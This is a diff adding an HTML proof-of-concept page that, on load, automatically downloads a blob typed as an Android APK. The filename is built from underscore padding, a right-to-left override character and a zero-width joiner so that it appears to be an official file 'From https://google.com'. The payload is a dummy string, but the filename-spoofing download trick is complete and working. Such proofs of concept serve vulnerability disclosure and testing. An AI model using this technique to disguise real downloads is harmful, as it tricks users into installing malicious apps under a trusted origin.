@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>PoC</title>
+</head>
+<body>
+  <h1>Download</h1>
+  <script>
+    const base = 'backup';
+    const pad = '_'.repeat(60);
+    const rlo = '\u202E' + 'official.';
+    const zwj = '\u200D';
+    const suffix = ' From https://google.com';
+    const filename = base + pad + rlo + zwj + suffix;
+
+    const blob = new Blob(['Dummy APK content'], { type: 'application/vnd.android.package-archive' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(() => {
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    }, 1000);
+  </script>
+</body>
+</html>
